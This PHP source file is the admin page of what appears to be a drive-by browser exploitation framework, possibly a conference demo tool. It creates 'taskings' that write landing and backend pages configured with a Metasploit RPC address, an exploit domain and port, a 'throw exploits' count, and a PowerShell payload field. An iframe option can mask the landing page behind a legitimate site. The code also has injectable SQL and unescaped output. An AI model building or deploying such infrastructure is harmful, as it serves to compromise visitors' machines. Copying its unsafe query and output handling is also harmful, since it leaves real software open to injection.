<?php

$page_purpose = "Tasking";
$page_filename = "view_taskings.php";
$db_table_name = "taskings";
$db_table_id = "tasking_id";

require_once ('includes/config.inc.php');
require_once ('../e/config_e.inc.php');
$page_title = 'View ' . $page_purpose . 's';
include ('includes/header.php');

// If no user_id session variable exists, redirect the user:
if (!isset($_SESSION['user_id'])) {
	$url = 'index.php'; // Define the URL.
	ob_end_clean(); // Delete the buffer.
	header("Location: $url");
	exit(); // Quit the script.
}

// --- --- ---

function get_random_string($valid_chars, $length)
{
    // start with an empty random string
    $random_string = "";

    // count the number of chars in the valid chars string so we know how many choices we have
    $num_valid_chars = strlen($valid_chars);

    // repeat the steps until we've created a string of the right length
    for ($i = 0; $i < $length; $i++)
    {
        // pick a random number from 1 up to the number of valid chars
        $random_pick = mt_rand(1, $num_valid_chars);

        // take the random character out of the string of valid chars
        // subtract 1 from $random_pick because strings are indexed starting at 0, and we started picking at 1
        $random_char = $valid_chars[$random_pick-1];

        // add the randomly-chosen char onto the end of our string so far
        $random_string .= $random_char;
    }

    // return our finished random string
    return $random_string;
}

// --- --- ---

// --- START POST ---

if (isset($_POST['submitted'])) { // Handle the form.

	require_once (MYSQL);
	
	// Trim all the incoming data:
	$trimmed = array_map('trim', $_POST);
	
	// Assume invalid values:
	$name = $iframe_flag = $debug_flag = $iframe_url = $iframe_title = $iframe_icon_url = $throw_count = FALSE;

	// Check for a valid name:
	if (name_reg($trimmed['name'])) {
		$name = mysqli_real_escape_string ($dbc, $trimmed['name']);
	}
	
	if ($trimmed['ps_payload']) {
		$ps_payload = mysqli_real_escape_string ($dbc, $trimmed['ps_payload']);
	}
	
	if ($_POST['throw_flag'] == 'yes')
	{ // Delete the record.
		$throw_flag = 'yes';
		
		//echo "throw_count: " . $throw_count;
		if ($trimmed['throw_count']) {
			$throw_count = mysqli_real_escape_string ($dbc, $trimmed['throw_count']);
			//echo "throw_count: " . $throw_count;
		}
		
	} else { // No confirmation of deletion.
		$throw_flag = 'no';
		$throw_count = "no";
	}
	
	// ---
	/*
	if (name_reg($trimmed['date'])) {
		$date = mysqli_real_escape_string ($dbc, $trimmed['date']);
	}
	
	if (name_reg($trimmed['time'])) {
		$t = mysqli_real_escape_string ($dbc, $trimmed['time']);
	}
	
	if (name_reg($trimmed['date'])) {
		$date = mysqli_real_escape_string ($dbc, $trimmed['date']);
	}
	
	if (name_reg($trimmed['time'])) {
		$t = mysqli_real_escape_string ($dbc, $trimmed['time']);
	}

	if ($_POST['iframe'] == 'Yes') { // Delete the record.
	
	} else { // No confirmation of deletion.
		echo '<p>The user has NOT been deleted.</p>';	
	}
	*/
	if ($_POST['iframe_flag'] == 'yes')
	{ // Delete the record.
		$iframe_flag = 'yes';
		
		if (name_reg($trimmed['iframe_url'])) {
			$iframe_url = mysqli_real_escape_string ($dbc, $trimmed['iframe_url']);
		}
		
		if (name_reg($trimmed['iframe_title'])) {
			$iframe_title = mysqli_real_escape_string ($dbc, $trimmed['iframe_title']);
		}
		
		if (name_reg($trimmed['iframe_icon_url'])) {
			$iframe_icon_url = mysqli_real_escape_string ($dbc, $trimmed['iframe_icon_url']);
		}
	
	} else { // No confirmation of deletion.
		$iframe_flag = 'no';
		$iframe_url = 'no';
		$iframe_title = 'no';
		$iframe_icon_url = 'no';
	}
	
	if ($_POST['debug_flag'] == 'yes') { // Delete the record.
		$debug_flag = 'yes';
	} else { // No confirmation of deletion.
		$debug_flag = 'no';
	}
	
	
	
	if ($name && $iframe_flag && $debug_flag && $throw_count) { // If everything's OK...

	//	$name = $iframe_flag = $debug_flag = $iframe_url = $iframe_title = $iframe_icon_url = FALSE;

	
		$date = date("m.d.y");
		$time = date("H:i:s");
		
		$random_flag = true;
		$random_string = '';
		while($random_flag === true)
		{	
			$original_string = 'abcdefghijklmnopqrstuvwxz';
			$random_string = get_random_string($original_string, 6);
			
			// Make the query
			$q = "SELECT ".$db_table_id." FROM ".$db_table_name . " WHERE random_string='" . $random_string . "'";
			$r = @mysqli_query ($dbc, $q); // Run the query.
			$num_rows = mysqli_num_rows($r);
			echo "$num_rows Rows\n";
			
			if($num_rows == 0)
			{
				$random_flag = false;
			}
		}
		
		//$frontend_url = WL_URL . '/' . $random_string . ".php";
		$frontend_url = WL_URL . '/' . $random_string;
		$backend_url = WL_URL . '/' . $random_string . "-be.php";
		
		// Add the user to the database:
		$q = "INSERT INTO " . $db_table_name . " (name, date, time, random_string, throw_count, frontend_url, backend_url, iframe_flag, iframe_url, iframe_title, iframe_icon_url, debug_flag) VALUES ('$name', '$date', '$time', '$random_string', '$throw_count', '$frontend_url', '$backend_url', '$iframe_flag', '$iframe_url', '$iframe_title', '$iframe_icon_url', '$debug_flag')";
		$r = mysqli_query ($dbc, $q) or trigger_error("Query: $q\n<br />MySQL Error: " . mysqli_error($dbc));

		if (mysqli_affected_rows($dbc) == 1) { // If it ran OK.

			// Finish the page:
			echo '<h3>' . $page_purpose . ' Added!</h3>';
			//include ('includes/footer.php'); // Include the HTML footer.
			//exit(); // Stop the page.
			
			// TODO: now copy files to location... :)
			
			// --- Front End ---
			
			$frontend_file_data = "<?php
define ('BACKEND_URL', '/".$random_string."-be.php');
";
			
			if ($_POST['iframe_flag'] == 'yes') { // Delete the record.
				$frontend_file_data .= "define ('IFRAME_FLAG', true);
define ('IFRAME_URL', '".$iframe_url."');
define ('IFRAME_TITLE', '".$iframe_title."');
define ('IFRAME_ICON_URL', '".$iframe_icon_url."');
";
			}else{
				$frontend_file_data .= "define ('IFRAME_FLAG', false);\n";
			}
			
			if ($_POST['debug_flag'] == 'yes') { // Delete the record.
				$frontend_file_data .= "define ('DEBUG_FLAG', true);\n";
			}else{
				$frontend_file_data .= "define ('DEBUG_FLAG', false);\n";	
			}
			
			$frontend_file_data .= "?>
";
			
			$frontend_file_data .= file_get_contents('/var/www/e/template-fe.php');
			//file_put_contents('/var/www/'. $random_string . '.php', $frontend_file_data);
			file_put_contents('/var/www/'. $random_string, $frontend_file_data);
			
			// --- Back End ---
			
			$frontend_file_data = "<?php
define ('MSGRPC_IP', '10.191.53.90');
define ('EXPLOIT_DOMAIN', 'blog.qu.gs');
define ('EXPLOIT_PORT', '805');
define ('WL_URL', '" . WL_URL . "');
define ('RAND_STR', '" . $random_string . "' );
define ('THROW_COUNT', '" . $throw_count . "');
define ('LOAD_PS_PAYLOAD', '" . $ps_payload . "');
";
			
			if ($_POST['debug_flag'] == 'yes') { // Delete the record.
				$frontend_file_data .= "define ('DEBUG_FLAG', true);\n";
			}else{
				$frontend_file_data .= "define ('DEBUG_FLAG', false);\n";	
			}
			
			$frontend_file_data .= "?>
";
			
			$frontend_file_data .= file_get_contents('/var/www/e/template-be.php');
			file_put_contents('/var/www/'. $random_string . '-be.php', $frontend_file_data);
			
			// --- Load / Payload / PS Payload ---

			//file_put_contents('/var/www/'. $random_string . '-p', $ps_payload);
			
			// --- --- ---
			
			//$output_one = shell_exec('nmap -sT -P0 -oA ' . $diry . $addressy . '_' . $date . '_' . $time . ' ' . $_POST['address']);

			

		} else { // If it did not run OK.
			echo '<p class="error">'.$page_purpose.' could not be registered due to a system error. We apologize for any inconvenience. 6</p>';
		}
	
	}

	//mysqli_close($dbc);

} // End of the main Submit conditional.

// --- END POST ---

// --- --- ---

echo '<h1>View ' . $page_purpose . 's</h1>';
require_once (MYSQL);

// Number of records to show per page:
$display = 100;

// Determine how many pages there are...
if (isset($_GET['p']) && is_numeric($_GET['p'])) { // Already been determined.
	$pages = $_GET['p'];
} else { // Need to determine.
 	// Count the number of records:
	$q = "SELECT COUNT(" . $db_table_id . ") FROM " . $db_table_name;
	$r = @mysqli_query ($dbc, $q);
	$row = @mysqli_fetch_array ($r, MYSQLI_NUM);
	$records = $row[0];
	// Calculate the number of pages...
	if ($records > $display) { // More than 1 page.
		$pages = ceil ($records/$display);
	} else {
		$pages = 1;
	}
} // End of p IF.

// Determine where in the database to start returning results...
if (isset($_GET['s']) && is_numeric($_GET['s'])) {
	$start = $_GET['s'];
} else {
	$start = 0;
}

// Determine the sort...
// Default is by registration date.
//$sort = (isset($_GET['sort'])) ? $_GET['sort'] : 'n';
$sort = (isset($_GET['sort'])) ? $_GET['sort'] : 'dt';

// Determine the sorting order:
switch ($sort) {
	case 'dt':
		$order_by = 'date_time DESC'; // ASC DESC
		break;
	case 'na':
		$order_by = 'name ASC'; // ASC DESC
		break;
	case 'rs':
		$order_by = 'random_string ASC'; // ASC DESC
		break;
	case 'tc':
		$order_by = 'throw_count ASC'; // ASC DESC
		break;
	default:
		$order_by = 'php_date_time DESC'; // ASC DESC
		$sort = 'dt';
		break;
}


//$throw_count
	
// Make the query:
$q = "SELECT ".$db_table_id.", CONCAT_WS(' ', date, time) AS date_time, name, random_string, throw_count, frontend_url, backend_url, iframe_flag, iframe_url, iframe_title, iframe_icon_url, debug_flag FROM ".$db_table_name." ORDER BY $order_by LIMIT $start, $display";
$r = @mysqli_query ($dbc, $q); // Run the query.

// Table header:
echo '<table align="center" cellspacing="0" cellpadding="5" width="75%">
<tr>
	<td align="left"><b><a href="'.$page_filename.'?sort=dt">Date Time</a></b></td>
	<td align="left"><b><a href="'.$page_filename.'?sort=na">Name</a></b></td>
	<td align="left"><b><a href="'.$page_filename.'?sort=rs">Random String</a></b></td>
	<td align="left"><b><a href="'.$page_filename.'?sort=tc">Throw Count</a></b></td>
</tr>
';

// Fetch and print all the records....
$bg = '#eeeeee'; 
while ($row = mysqli_fetch_array($r, MYSQLI_ASSOC)) {
	$bg = ($bg=='#eeeeee' ? '#ffffff' : '#eeeeee');
		echo '<tr bgcolor="' . $bg . '">
		<td align="left">' . $row['date_time'] . '</td>
		<td align="left">' . $row['name'] . '</td>
		<td align="left">' . $row['random_string'] . '</td>
		<td align="left">' . $row['throw_count'] . '</td>
	</tr>';
	
	echo '<tr bgcolor="' . $bg . '">';
	echo '<td align="left"  colspan="1">';
	echo 'fe: ' . $row['frontend_url'];
	echo '</td>';
	//echo '</tr>';
	
	//echo '<tr bgcolor="' . $bg . '">';
	echo '<td align="left"  colspan="3">';
	echo 'be: ' . $row['backend_url'];
	echo '</td>';
	echo '</tr>';
	
// iframe_flag, iframe_url, iframe_title, iframe_icon_url, debug_flag
	
	if( strcmp( $row['iframe_flag'], "yes") == 0 )
	{
		echo '<tr bgcolor="' . $bg . '">';
		echo '<td align="left" colspan="1">';
		echo 'iframe_flag: ' . $row['iframe_flag'];
		echo '</td>';
		//echo '</tr>';
		
		//echo '<tr bgcolor="' . $bg . '">';
		echo '<td align="left" colspan="3">';
		echo 'iframe_url: ' . $row['iframe_url'];
		echo '</td>';
		echo '</tr>';
		
		echo '<tr bgcolor="' . $bg . '">';
		echo '<td align="left" colspan="1">';
		echo 'iframe_title: ' . $row['iframe_title'];
		echo '</td>';
		
		//echo '<tr bgcolor="' . $bg . '">';
		echo '<td align="left" colspan="3">';
		echo 'iframe_icon_url: ' . $row['iframe_icon_url'];
		echo '</td>';
		echo '</tr>';
	}
	else
	{
		echo '<tr bgcolor="' . $bg . '">';
		echo '<td align="left"  colspan="4">';
		echo 'iframe_flag: ' . $row['iframe_flag'];
		echo '</td>';
		echo '</tr>';
	}

	if( strcmp( $row['debug_flag'], "yes") == 0 )
	{
		echo '<tr bgcolor="' . $bg . '">';
		echo '<td align="left"  colspan="4">';
		echo 'debug_flag: ' . $row['debug_flag'];
		echo '</td>';
		echo '</tr>';
	}
	else
	{
		echo '<tr bgcolor="' . $bg . '">';
		echo '<td align="left"  colspan="4">';
		echo 'debug_flag: ' . $row['debug_flag'];
		echo '</td>';
		echo '</tr>';
	}
	
	//<tr bgcolor="' . $bg . '">
	// <td align="left"  colspan="3">
		
		/*
		 *
		 	
		 *
		 */
		
		

		
		
		
		
		
	//php_http_user_agent
	
} // End of WHILE loop.

echo '</table>';
mysqli_free_result ($r);
//mysqli_close($dbc);

// Make the links to other pages, if necessary.
if ($pages > 1) {
	
	echo '<br /><p>';
	$current_page = ($start/$display) + 1;
	
	// If it's not the first page, make a Previous button:
	if ($current_page != 1) {
		echo '<a href="'.$page_filename.'?s=' . ($start - $display) . '&p=' . $pages . '&sort=' . $sort . '">Previous</a> ';
	}
	
	// Make all the numbered pages:
	for ($i = 1; $i <= $pages; $i++) {
		if ($i != $current_page) {
			echo '<a href="'.$page_filename.'?s=' . (($display * ($i - 1))) . '&p=' . $pages . '&sort=' . $sort . '">' . $i . '</a> ';
		} else {
			echo $i . ' ';
		}
	} // End of FOR loop.
	
	// If it's not the last page, make a Next button:
	if ($current_page != $pages) {
		echo '<a href="'.$page_filename.'?s=' . ($start + $display) . '&p=' . $pages . '&sort=' . $sort . '">Next</a>';
	}
	
	echo '</p>'; // Close the paragraph.
	
} // End of links section.
?>

<div align="center"><p></p></div>
<div align="center"><p></p></div>
<div align="center"><p></p></div>
<div align="center"><p></p></div>
<div align="center"><p></p></div>
<div align="center"><p></p></div>
<div align="center"><p></p></div>
<div align="center"><p></p></div>
<div align="center"><p></p></div>


<h1>Add a new <?php echo $page_purpose ?></h1>

<form action="<?php echo $page_filename ?>" method="post">
	<fieldset>
		
		<p>Name:</br> <input type="text" name="name" size="20" maxlength="40" value="<?php if (isset($trimmed['name'])) { echo $trimmed['name']; } else { echo "Test"; } ?>" id="InputBig" placeholder="Tasking Name"/></p>
		
		<p>Throw Exploits?
			<input type="radio" name="throw_flag" value="yes" checked="checked" /> Yes 
			<input type="radio" name="throw_flag" value="no" /> No 
		</p>
		
		<p>Throw Count:</br> <input type="text" name="throw_count" size="20" maxlength="40" value="<?php if (isset($trimmed['throw_count'])) { echo $trimmed['throw_count']; } else {echo "1"; } ?>" id="InputBig" placeholder="1"/></p>
		
		<p>Powershell Payload:</br>
			<textarea name="ps_payload" rows="3" cols="50" value="<?php if (isset($trimmed['ps_payload'])) echo $trimmed['ps_payload']; ?>" id="InputTextBox" placeholder="Invoke-Item c:\windows\system32\calc.exe"/>Invoke-Item c:\windows\system32\calc.exe</textarea>
		</p>
		
		
		<p>iFrame to Website? (Ensure the X-Frame-Options of the WebSite allow this)
			<input type="radio" name="iframe_flag" value="yes" checked="checked" /> Yes 
			<input type="radio" name="iframe_flag" value="no" /> No 
		</p>
		
		<p>iFrame URL:</br> <input type="text" name="iframe_url" size="20" maxlength="2047" value="<?php if (isset($trimmed['iframe_url'])) { echo $trimmed['iframe_url']; } else { echo "http://derbycon.org/"; } ?>" id="InputBig" placeholder="http://blackhat.com/"/></p>
		<p>iFrame Title:</br> <input type="text" name="iframe_title" size="20" maxlength="2047" value="<?php if (isset($trimmed['iframe_title'])) { echo $trimmed['iframe_title']; } else { echo "DerbyCon : Louisville, Kentucky"; } ?>" id="InputBig" placeholder="Black Hat | Home"/></p>
		<p>iFrame Icon URL:</br> <input type="text" name="iframe_icon_url" size="20" maxlength="2047" value="<?php if (isset($trimmed['iframe_icon_url'])) { echo $trimmed['iframe_icon_url']; } else { echo "http://www.derbycon.com/wp-content/themes/Derbycon_2014/favicon.ico"; } ?>" id="InputBig" placeholder="http://blackhat.com/images/favicon2.ico"/></p>
		
		<p>Enable Debug?
			<input type="radio" name="debug_flag" value="yes" /> Yes 
			<input type="radio" name="debug_flag" value="yo" checked="checked" /> No</p>
		</p>
		
	</fieldset>
		
	<div align="center"><input type="submit" name="submit" value="Add" id="Button" placeholder="Login"/></div>
	<input type="hidden" name="submitted" value="TRUE" />
<!--<small>Password must be between 4 and 20 characters long and use only letters, numbers, and the underscore.</small>-->
</form>

<?php
// Include the HTML footer.	
include ('includes/footer.php');
mysqli_close($dbc);
?>
